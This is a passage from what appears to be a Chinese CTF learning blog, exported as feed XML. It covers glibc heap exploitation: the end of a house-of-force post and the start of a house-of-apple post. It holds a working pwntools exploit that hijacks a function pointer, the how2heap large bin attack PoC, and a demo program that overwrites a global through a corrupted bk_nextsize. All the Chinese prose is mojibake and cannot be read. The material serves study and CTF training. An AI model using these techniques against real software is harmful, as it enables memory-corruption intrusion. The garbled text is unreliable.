chunkçš„sizeä½ä¸º0xffffffffffffffff</p><p>2ã€ç„¶åçœ‹ä¸€ä¸‹top chunkå’Œå­˜åœ¨å‡½æ•°æŒ‡é’ˆçš„é‚£ä¸ªchunkçš„åç§»(å¦‚ä¸‹å›¾)</p><p><img src="/../img/image-20221007213446799.png" alt="image-20221007213446799"></p><p>ç„¶åå†å‡å»0x20ï¼Œæœ€åå¾—åˆ°åç§»ä¸º0x60</p><p>3ã€å°†top chunkæ›´æ–°åˆ°æŒ‡é’ˆå †å—çš„ä½ç½®ã€‚</p><p>4ã€å°†æŒ‡é’ˆå †å—ç”³è¯·å‡ºæ¥ï¼Œå†™å…¥åé—¨åœ°å€å³å¯ã€‚</p><h3 id="EXPï¼š-1"><a href="#EXPï¼š-1" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc32.so&#x27;)</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,25708)</span></span><br><span class="line">c_a=<span class="number">0x400E90</span></span><br><span class="line">c_d=<span class="number">0x400EA8</span></span><br><span class="line">c_e=<span class="number">0x400E9C</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the name of item:&quot;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,length,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please enter the new name of the item:&quot;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p,c_a,0x400AB8)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">add(-<span class="number">0x60</span>,<span class="string">&#x27;bbbbbc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x400D49</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007213348218.png" alt="image-20221007213348218"></p><p>è¿œç¨‹ç”¨unlinkæ‰“ï¼Œæˆ‘è¿™é‡Œä»…ä»…æ˜¯é€šè¿‡è¿™é“é¢˜æ¥æ¼”ç¤ºhouse of force</p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å †æº¢å‡º </tag>
            
            <tag> house of force </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºhouse of appleçš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/19609dd.html"/>
      <url>/posts/19609dd.html</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h3><p><code>house of apple</code> æ˜¯ <a href="https://roderickchan.github.io/">roderick</a> å¸ˆå‚…æå‡ºçš„ä¸€ç§éå¸¸ä¼˜ç§€çš„ <code>IO</code> æ”»å‡»åˆ©ç”¨æ–¹æ³•ï¼Œåº”è¯¥åœ¨åˆšåˆšå­¦ä¹ å…³äºå †çš„æ¼æ´æ—¶ä¾¿çœ‹åˆ° <strong>roderick</strong> å¸ˆå‚…æå‡ºçš„è¿™ç§åˆ©ç”¨æ–¹æ³•ï¼Œå½“æ—¶çœ‹ç€æ–‡ç« ä¸Šå‡ºç°çš„å¾ˆå¤šä¸è®¤è¯†çš„åè¯æ„Ÿæ…¨è‡ªå·±æ‰€äº†è§£çš„å¤ªå°‘ï¼Œæ—¶éš”è¿‘ä¸ƒä¸ªæœˆç°åœ¨ç»ˆäºå­¦ä¹ åˆ°äº† <code>house of apple</code> ã€‚è€Œè¿™ç¯‡æ–‡ç« ä»…ä»…æ˜¯è®°å½•è‡ªå·±å…³äº <code>house of apple</code> çš„å­¦ä¹ æ€»ç»“ï¼Œå¦‚æœçœŸæ­£è¦è¿›è¡Œå¯¹ <code>house of apple</code> çš„å­¦ä¹ è¿˜æ˜¯å»ºè®®å»çœ‹ <strong>roderick</strong> å¸ˆå‚…å‘è¡¨çš„ä¸‰ç¯‡æ–‡ç« ã€‚</p><p><strong>æœ¬æ–‡æ‰€æœ‰çš„ <code>glibc</code> æºä»£ç å‡æ¥è‡ª <code>2.31</code> ç‰ˆæœ¬</strong></p><h3 id="large-bin-attackï¼š"><a href="#large-bin-attackï¼š" class="headerlink" title="large bin attackï¼š"></a>large bin attackï¼š</h3><p><code>house of apple</code> çš„æ”»å‡»å‰æé€šå¸¸æ˜¯ä½¿ç”¨ <code>large bin attack</code> ï¼Œå› æ­¤éœ€è¦å…ˆä»‹ç»ä¸€ä¸‹ <code>glibc</code> é«˜ç‰ˆæœ¬ä¸­çš„ <code>large bin attack</code>ã€‚ <code>glibc</code> ä½ç‰ˆæœ¬çš„ <code>large bin attack</code> å¯ä»¥å‘ä»»æ„ä¸¤ä¸ªåœ°å€å†™å…¥ä¸¤ä¸ªå †åœ°å€ï¼Œè€Œé«˜ç‰ˆæœ¬çš„ <code>large bin attack</code> æ”»å‡»æ•ˆæœæ˜¯å¯ä»¥å‘ä»»æ„ä¸€ä¸ªåœ°å€å†™å…¥ä¸€ä¸ªå †åœ°å€ã€‚</p><p>æ¼æ´æºç å¦‚ä¸‹ï¼š</p><p>ä¸‹é¢ä»£ç ä½äº <code>ptmalloc</code> éå† <code>unsorted bin</code> å¯»æ±‚åˆé€‚å †å—æ—¶å°†å †å—åˆ†ç±»ï¼Œä½¿å †å—é“¾å…¥ <code>large bin </code> è¿‡ç¨‹çš„ä»£ç ç‰‡æ®µ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="æ¼æ´åŸç†ï¼š"><a href="#æ¼æ´åŸç†ï¼š" class="headerlink" title="æ¼æ´åŸç†ï¼š"></a>æ¼æ´åŸç†ï¼š</h5><p>è¿™éƒ¨åˆ†ä»£ç å­˜åœ¨çš„é—®é¢˜åœ¨äº <code>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</code> <code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code> è¿™ä¸¤è¡Œä»£ç ä¸­ï¼Œ <code>victim</code> æ˜¯å°†è¦è¢«é“¾å…¥è¿› <code>large bin</code> çš„å †å—ï¼Œè€Œ <code>fwd</code> æ˜¯æ¯” <code>victim</code> å¤§ä¸”ä½äºåŒä¸€ä¸ª <code>large bin</code> çš„å †å—ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶  <code>fwd-&gt;bk_nextsize</code> ä¸º <code>target_addr</code>ï¼ˆé€šè¿‡å †æº¢å‡ºæˆ–è€… <code>UAF</code>ï¼‰ï¼Œè¿™æ ·åœ¨ <code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code> æ‰§è¡Œæ—¶ï¼Œå°±ç›¸å½“äºæ˜¯å‘ <code>target+0x20</code> çš„ä½ç½®å†™å…¥ <code>victim</code>ã€‚å› ä¸º Cè¯­è¨€ é‡Œè®¿é—®ç»“æ„ä½“çš„æˆå‘˜æœ¬è´¨ä¸Šæ˜¯é€šè¿‡åç§»è¿›è¡Œè®¿é—®çš„ï¼Œæ‰€ä»¥ <code>-&gt;fd_nextsize</code> ç›¸å½“äº <code>+0x20</code>ã€‚</p><h5 id="åˆ©ç”¨è¿‡ç¨‹ï¼š"><a href="#åˆ©ç”¨è¿‡ç¨‹ï¼š" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹ï¼š"></a>åˆ©ç”¨è¿‡ç¨‹ï¼š</h5><ol><li><p>ç”³è¯·ä¸€ä¸ª <code>å †å—A</code>ï¼Œå°†å…¶é‡Šæ”¾æ‰è¿›å…¥ <code>unsorted bin</code> ï¼Œå†ç”³è¯·ä¸€ä¸ªæ¯” <code>å †å—A</code> å¤§çš„ <code>å †å—U</code> ,æ­¤æ—¶ <code>å †å—A</code> è¿›å…¥ <code>large bin</code></p></li><li><p>ç”³è¯·ä¸€ä¸ª <code>å †å—B</code> ï¼Œå°†å…¶é‡Šæ”¾è¿›å…¥ <code>unsorted bin</code> ã€‚ <code>å †å—B</code> éœ€è¦æ¯” <code>å †å—A</code> å°ä¸”äºŒè€…éœ€è¦ä½äºåŒä¸€ä¸ª <code>large bin</code> ä¸­ã€‚</p></li><li><p>åˆ©ç”¨ <code>å †æº¢å‡º</code> æˆ–è€… <code>UAF</code> ç­‰æ–¹å¼æ¥ç¯¡æ”¹ <code>å †å—A</code> çš„ <code>bk_nextsize</code> ä¸º <code>target_addr-0x20</code></p></li><li><p>æœ€åé‡Šæ”¾ä¸€ä¸ªè·Ÿ <code>å †å—A</code> å’Œ <code>å †å—B</code> ä½äºåŒä¸€ä¸ª <code>large bin</code> ä¸”æ¯” <code>å †å—A</code> å’Œ <code>å †å—B</code> éƒ½å¤§çš„ <code>å †å—C</code></p></li><li><p>æ­¤æ—¶è§¦å‘ <code>large bin attack</code> ï¼Œæ”»å‡»æ•ˆæœæ˜¯å‘ <code>target_addr</code> ä¸­å†™å…¥ <code>å †å—B</code> çš„åœ°å€</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œä¸Šè¿° <code>å †å—A</code> <code>å †å—B</code> <code>å †å—C</code> <code>å †å—U</code> çš„å¤§å°å¯ä»¥åˆ†åˆ«ä¸º <code>0x428</code> <code>0x418</code> <code>0x438</code> <code>0x438</code></p></li></ol><p><code>poc</code>å¦‚ä¸‹ï¼Œè¯¥ <code>poc</code> æ¥è‡ª <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/large_bin_attack.c">how2heap</a></p><p>ç„¶åæˆ‘æŠŠå‰é¢ä¸€éƒ¨åˆ†ç¿»è¯‘æˆäº†ä¸­æ–‡</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">fwd = bck;</span></span><br><span class="line"><span class="comment">bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;è‡ªglibc2.30ä»¥æ¥ï¼Œå¯¹å¤§å‹binå—æ’å…¥å®æ–½äº†ä¸¤é¡¹æ–°æ£€æŸ¥\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;æ£€æŸ¥ 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;è¿™é˜²æ­¢äº†ä¼ ç»Ÿçš„large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;ç„¶è€Œï¼Œä»æœ‰ä¸€æ¡å¯èƒ½çš„è·¯å¾„è§¦å‘large bin attackã€‚PoCå¦‚ä¸‹æ‰€ç¤ºï¼š \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;ä»¥ä¸‹æ˜¯æˆ‘ä»¬è¦è¦†ç›–çš„ç›®æ ‡ (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;é¦–å…ˆï¼Œæˆ‘ä»¬åˆ†é…ä¸€ä¸ªå¤§çš„å—[p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;å¦ä¸€ä¸ªå †å—é˜²æ­¢åˆå¹¶\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;æˆ‘ä»¬è¿˜åˆ†é…äº†ç¬¬äºŒä¸ªå †å— [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;æ­¤å †å—åº”å°äº[p1]ï¼Œå¹¶å±äºåŒä¸€ä¸ªlarge bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;å†æ¬¡åˆ†é…ä¿æŠ¤å—ä»¥é˜²æ­¢åˆå¹¶\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;é‡Šæ”¾ä¸¤ä¸ª--&gt;[p1]ä¸­è¾ƒå¤§çš„ä¸€ä¸ª --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;åˆ†é…å¤§äº[p1]çš„å—ä»¥å°†[p1]æ’å…¥large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;é‡Šæ”¾ä¸¤ä¸ª--&gt;[p2]ä¸­è¾ƒå°çš„ä¸€ä¸ª (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;æ­¤æ—¶, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ è½½æºç è°ƒè¯•ä¸Šé¢çš„ <code>poc</code> ï¼ŒåŸºæœ¬è°ƒè¯•ä¸¤éå°±æ˜ç™½åˆ©ç”¨è¿‡ç¨‹äº†ã€‚</p><h5 id="è¡¥å……ï¼š"><a href="#è¡¥å……ï¼š" class="headerlink" title="è¡¥å……ï¼š"></a>è¡¥å……ï¼š</h5><p>ä¸Šè¿° <code>large bin attack</code> çš„åˆ©ç”¨æ˜¯æœ€åˆåœ¨æŸ¥æ‰¾ç½‘ä¸Šèµ„æ–™è‡ªå­¦çš„æ—¶å€™çœ‹è§çš„åšæ³•ï¼Œä½†äº‹å®ä¸Šæœ‰ä¸€ä¸ªæ›´ç®€å•çš„æ–¹æ³•åªéœ€è¦ä¸¤æ¬¡è¿›å…¥ <code>large bin</code> å³å¯ï¼ˆä¸Šé¢çš„åšæ³•æ˜¯ä¸€å…±ç”¨äº†ä¸‰æ¬¡è¿›å…¥ <code>large bin</code> çš„å †å—ï¼‰ã€‚ </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">      <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = bck;</span><br><span class="line">              bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">              victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">          ...</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p><code>victim-&gt;fd_nextsize = fwd-&gt;fd;</code> æ­¤å¤„çš„ <code>fwd-&gt;fd</code> æŒ‡å‘çš„æ˜¯å”¯ä¸€å­˜åœ¨ <code>large bin</code> ä¸­çš„å †å—ï¼Œæ¼æ´åœ¨ä¸‹é¢ä¸¤è¡Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p>ä¾ç„¶æ˜¯æ§åˆ¶ <code>bk_nextsize</code> ï¼Œç„¶åå‘ <code>bk_nextsize-0x20</code> çš„ä½ç½®å†™ä¸€ä¸ªå †åœ°å€ <code>victim</code> å’Œä¸Šé¢åˆ©ç”¨ä¸€æ ·ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œå¯ä»¥å…ˆç”³è¯·ä¸€ä¸ª <code>0x428</code> çš„å †å—è¿›å…¥ <code>large bin</code>ï¼Œç„¶åå»ç¯¡æ”¹å…¶ <code>bk_nextsize</code> ï¼Œå†è®©ä¸€ä¸ª <code>0x418</code> çš„å †å—è¿›å…¥ <code>large bin</code> å³å¯è§¦å‘ <code>large bin attack</code> </p><p><code>demo</code> å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//Ubuntu GLIBC 2.35-0ubuntu3.1 </span></span><br><span class="line"><span class="comment">//gcc demo.c -o demo -g -w</span></span><br><span class="line"><span class="type">char</span> data[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data address -------&gt; %p\n&quot;</span>,&amp;data);<span class="comment">//æœ€ç»ˆè¢«å†™å…¥æ•°æ®çš„å…¨å±€å˜é‡åœ°å€ </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data value   -------&gt; %s\n&quot;</span>,data);<span class="comment">//æ­¤æ—¶å…¨å±€çš„å†…å®¹ä¸ºç©º </span></span><br><span class="line">    </span><br><span class="line"><span class="type">void</span> *libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x60770</span>;<span class="comment">//è·å–libcåŸºåœ°å€ </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc base address ------&gt; %p\n&quot;</span>,libc_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p=<span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">char</span> *p1=<span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p chunk address--------&gt; %p\n&quot;</span>,p);</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)(p+<span class="number">0x18</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)&amp;data<span class="number">-0x20</span>;</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data value -------&gt; %s\n&quot;</span>,data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302011939896.png" alt="image-20230201193929700"></p><h3 id="house-of-appleï¼š"><a href="#house-of-appleï¼š" class="headerlink" title="house of appleï¼š"></a>house of appleï¼š</h3><p><strong>roderick</strong> å¸ˆå‚…å‘è¡¨äº†å…³äºè¯¥æ‰‹æ³•çš„ä¸‰ç¯‡æ–‡ç« ï¼Œæˆ‘è¿™é‡Œçš„å­¦ä¹ æ€»ç»“åªè®°å½•å‰ä¸¤ç¯‡æ–‡ç« ã€‚</p><h4 id="house-of-apple1"><a href="#house-of-apple1" class="headerlink" title="house of apple1"></a>house of apple1</h4><h5 id="åˆ©ç”¨æ¡ä»¶ï¼š"><a href="#åˆ©ç”¨æ¡ä»¶ï¼š" class="headerlink" title="åˆ©ç”¨æ¡ä»¶ï¼š"></a>åˆ©ç”¨æ¡ä»¶ï¼š</h5><ol><li>å¯ä»¥æ³„éœ² <code>libc</code> åœ°å€å’Œå †åœ°å€ </li><li>å¯ä»¥ä½¿ç”¨ä»»æ„åœ°å€å†™ä¸€ä¸ªå †åœ°å€ï¼ˆé€šå¸¸æ˜¯ä½¿ç”¨ <code>large bin attack</code> ï¼‰</li><li>ä» <code>main</code> å‡½æ•°è¿”å›æˆ–è€…è°ƒç”¨ <code>exit</code> å‡½æ•°</li></ol><h5 id="æ”»å‡»æ•ˆæœï¼š"><a href="#æ”»å‡»æ•ˆæœï¼š" class="headerlink" 